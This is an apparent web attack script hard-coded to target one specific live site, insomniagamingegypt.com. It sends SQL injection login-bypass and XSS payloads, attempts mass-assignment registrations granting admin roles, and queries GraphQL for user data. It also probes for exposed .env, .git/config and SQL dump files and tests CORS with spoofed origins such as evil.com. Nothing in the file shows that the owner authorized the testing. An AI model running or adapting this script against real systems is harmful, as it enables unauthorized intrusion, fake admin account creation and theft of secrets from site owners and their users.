#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""Public Endpoint Vulnerability Test - No Auth Required"""
import requests
import urllib3
import json
import re
import time

urllib3.disable_warnings()

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

base = 'https://insomniagamingegypt.com'

print('='*70)
print('PUBLIC ENDPOINT VULNERABILITY TEST')
print('='*70)

vulnerabilities = []

# =============================================================================
# 1. LOGIN FORM TESTING
# =============================================================================
print('\n[*] LOGIN FORM SECURITY TESTS')
print('-'*50)

login_url = base + '/login'

# Get login page
try:
    r = s.get(login_url, timeout=10, verify=False)
    print(f'    Login page status: {r.status_code}')
    
    # Check for CSRF token - broad pattern for multiple frameworks
    csrf = re.search(r'(csrf[_-]?token|authenticity_token|_token|csrf-token)\s*[=:]\s*["\']([^"\']+)["\']', r.text, re.I)
    if csrf:
        print(f'    CSRF token found: {csrf.group(1)[:20]}...')
    else:
        print(f'    [!] NO CSRF TOKEN DETECTED')
        vulnerabilities.append(('MEDIUM', 'Missing CSRF Token', login_url))
except Exception as e:
    print(f'    Error: {e}')

# Test SQL Injection in login
print('\n    Testing SQL Injection in login...')
sqli_payloads = [
    {"email": "admin'--", "password": "test"},
    {"email": "admin' OR '1'='1", "password": "test"},
    {"email": "admin' OR 1=1--", "password": "test"},
    {"email": "' OR ''='", "password": "' OR ''='"},
    {"email": "admin@admin.com' --", "password": "anything"},
]

for payload in sqli_payloads:
    try:
        # Try JSON first
        r = s.post(login_url, json=payload, timeout=10, verify=False, allow_redirects=False)
        if r.status_code in [415, 400] or not r.text:
            # Try form-encoded if JSON fails
            r = s.post(login_url, data=payload, timeout=10, verify=False, allow_redirects=False)
        
        # Check for SQL errors
        sql_errors = ['sqlstate', 'pdoexception', 'syntax', 'mysql', 'database error']
        has_error = any(e in r.text.lower() for e in sql_errors)
        
        # Check for successful bypass
        bypass_indicators = ['dashboard', 'welcome', 'profile', 'logout', 'home']
        is_bypass = r.status_code == 302 or any(i in r.text.lower() for i in bypass_indicators)
        
        if has_error:
            print(f'    [!] SQL ERROR in login: {payload["email"]}')
            vulnerabilities.append(('HIGH', 'SQL Injection (Login)', login_url, payload))
        elif is_bypass and r.status_code != 200:
            print(f'    [!] POTENTIAL BYPASS: {payload["email"]} -> {r.status_code}')
    except requests.RequestException:
        pass

# Test XSS in login
print('\n    Testing XSS in login...')
xss_payloads = [
    {"email": '<script>alert(1)</script>@test.com', "password": "test"},
    {"email": 'test@test.com', "password": '<script>alert(1)</script>'},
    {"email": '"><script>alert(1)</script>@test.com', "password": "test"},
]

for payload in xss_payloads:
    try:
        r = s.post(login_url, json=payload, timeout=10, verify=False)
        if payload['email'] in r.text or payload['password'] in r.text:
            print(f'    [!] XSS REFLECTED: {str(payload)[:40]}')
            vulnerabilities.append(('MEDIUM', 'XSS in Login', login_url, payload))
    except requests.RequestException:
        pass

# =============================================================================
# 2. REGISTER FORM TESTING
# =============================================================================
print('\n[*] REGISTER FORM SECURITY TESTS')
print('-'*50)

register_url = base + '/api/auth/register'

# Test mass assignment
print('    Testing Mass Assignment...')
ma_payloads = [
    {"name": "test", "email": "test123@test.com", "password": "Test123!", "role": "admin"},
    {"name": "test", "email": "test456@test.com", "password": "Test123!", "is_admin": True},
    {"name": "test", "email": "test789@test.com", "password": "Test123!", "permissions": ["admin"]},
]

for payload in ma_payloads:
    try:
        r = s.post(register_url, json=payload, timeout=10, verify=False)
        if r.status_code in [200, 201]:
            print(f'    [!] MASS ASSIGNMENT possible: {str(payload)[:50]}')
            print(f'        Response: {r.text[:100]}')
            vulnerabilities.append(('HIGH', 'Mass Assignment', register_url, payload))
        else:
            print(f'    {r.status_code}: {str(payload)[:40]}')
    except Exception as e:
        print(f'    Error: {str(e)[:30]}')

# Test email validation bypass
print('\n    Testing Email Validation Bypass...')
email_payloads = [
    {"email": "test@test.com' OR '1'='1", "password": "Test123!", "name": "test"},
    {"email": "admin@insomniagamingegypt.com\0@test.com", "password": "Test123!", "name": "test"},
    {"email": "test+admin@test.com", "password": "Test123!", "name": "test"},
]

for payload in email_payloads:
    try:
        r = s.post(register_url, json=payload, timeout=10, verify=False)
        print(f'    {payload["email"][:30]:30} -> {r.status_code}')
    except requests.RequestException:
        pass

# =============================================================================
# 3. PASSWORD RESET TESTING
# =============================================================================
print('\n[*] PASSWORD RESET SECURITY TESTS')
print('-'*50)

reset_urls = [
    '/api/auth/forgot-password',
    '/api/auth/password/reset',
    '/api/auth/password/email',
    '/forgot-password',
    '/password/reset',
]

for url in reset_urls:
    full_url = base + url
    try:
        # Test if endpoint exists
        r = s.get(full_url, timeout=5, verify=False)
        if r.status_code != 404:
            print(f'    Found: {url} ({r.status_code})')
            
            # Test POST
            r2 = s.post(full_url, json={"email": "test@test.com"}, timeout=5, verify=False)
            print(f'        POST -> {r2.status_code}: {r2.text[:50]}')
    except requests.RequestException:
        pass

# =============================================================================
# 4. PUBLIC API ENDPOINTS
# =============================================================================
print('\n[*] PUBLIC API ENDPOINT TESTS')
print('-'*50)

public_endpoints = [
    '/api',
    '/api/v1',
    '/graphql',
    '/api/docs',
    '/api/swagger.json',
    '/api/openapi.json',
]

for ep in public_endpoints:
    try:
        r = s.get(base + ep, timeout=5, verify=False)
        if r.status_code == 200:
            print(f'    {ep:30} | 200 | {len(r.text)} bytes')
            
            # Check for sensitive data
            sensitive = ['api_key', 'secret', 'token', 'password', 'credential']
            if any(s in r.text.lower() for s in sensitive):
                print(f'        [!] SENSITIVE DATA EXPOSED')
                vulnerabilities.append(('MEDIUM', 'Sensitive Data Exposure', base + ep))
    except requests.RequestException:
        pass

# Test GraphQL
print('\n    GraphQL Testing...')
graphql_queries = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{users{id email}}"}',
    '{"query":"mutation{login(email:\\"admin@test.com\\",password:\\"test\\"){token}}"}',
]

for query in graphql_queries:
    try:
        r = s.post(base + '/graphql', data=query, timeout=5, verify=False,
                   headers={'Content-Type': 'application/json'})
        if r.status_code == 200 and 'errors' not in r.text:
            print(f'    [!] GRAPHQL EXPOSURE')
            print(f'        Response: {r.text[:100]}')
            vulnerabilities.append(('MEDIUM', 'GraphQL Introspection', base + '/graphql'))
    except requests.RequestException:
        pass

# =============================================================================
# 5. FILE UPLOAD TESTS
# =============================================================================
print('\n[*] FILE UPLOAD TESTS')
print('-'*50)

upload_endpoints = [
    '/api/upload',
    '/api/files',
    '/api/media',
    '/upload',
]

for ep in upload_endpoints:
    try:
        # Test without file
        r = s.post(base + ep, timeout=5, verify=False)
        if r.status_code not in [404, 405]:
            print(f'    {ep}: {r.status_code}')
    except requests.RequestException:
        pass

# =============================================================================
# 6. INFORMATION DISCLOSURE
# =============================================================================
print('\n[*] INFORMATION DISCLOSURE TESTS')
print('-'*50)

info_files = [
    '/.env',
    '/.git/config',
    '/.htaccess',
    '/web.config',
    '/phpinfo.php',
    '/server-status',
    '/.svn/entries',
    '/composer.json',
    '/package.json',
    '/config.php',
    '/backup.sql',
    '/dump.sql',
    '/database.sql',
]

for file in info_files:
    try:
        r = s.get(base + file, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 50:
            print(f'    [!] EXPOSED: {file} ({len(r.text)} bytes)')
            vulnerabilities.append(('HIGH', 'Information Disclosure', base + file))
    except requests.RequestException:
        pass

# =============================================================================
# 7. HEADER SECURITY
# =============================================================================
print('\n[*] SECURITY HEADERS CHECK')
print('-'*50)

r = s.get(base, timeout=10, verify=False)

headers_to_check = {
    'X-Frame-Options': 'Clickjacking protection',
    'Content-Security-Policy': 'XSS protection',
    'Strict-Transport-Security': 'HTTPS enforcement',
    'X-Content-Type-Options': 'MIME sniffing protection',
    'Referrer-Policy': 'Referrer control',
    'Permissions-Policy': 'Feature restriction',
    'X-XSS-Protection': 'XSS filter',
}

for header, purpose in headers_to_check.items():
    if header not in r.headers:
        print(f'    [!] MISSING: {header} ({purpose})')
        vulnerabilities.append(('LOW', f'Missing {header}', base))
    else:
        print(f'    OK: {header}: {r.headers[header][:30]}')

# =============================================================================
# 8. CORS DEEP TEST
# =============================================================================
print('\n[*] CORS DEEP TESTING')
print('-'*50)

cors_origins = [
    'https://evil.com',
    'https://attacker.com',
    'null',
    'http://localhost',
    base,
]

cors_endpoints = ['/api', '/api/events', '/graphql', '/']
for ep in cors_endpoints:
    for origin in cors_origins:
        try:
            r = s.options(base + ep, headers={'Origin': origin}, timeout=5, verify=False)
            acao = r.headers.get('Access-Control-Allow-Origin', 'Not Set')
            acac = r.headers.get('Access-Control-Allow-Credentials', 'Not Set')
            
            if acao == origin and acac == 'true':
                print(f'    [!] CORS ALLOWS: {origin} with credentials on {ep}!')
                vulnerabilities.append(('HIGH', 'CORS Misconfiguration', base + ep, origin))
            elif acao == '*':
                print(f'    [!] CORS WILDCARD on {ep}')
        except requests.RequestException:
            pass

# =============================================================================
# SUMMARY
# =============================================================================
print('\n' + '='*70)
print('VULNERABILITY SUMMARY')
print('='*70)

if vulnerabilities:
    for sev, name, url, *extra in vulnerabilities:
        color = '🔴' if sev == 'HIGH' else '🟠' if sev == 'MEDIUM' else '🟡'
        print(f'{color} [{sev}] {name}')
        print(f'    URL: {url}')
        if extra:
            print(f'    Details: {extra}')
        print()
    
    print(f'Total: {len(vulnerabilities)} vulnerabilities')
else:
    print('No vulnerabilities found in public endpoints.')

print('='*70)
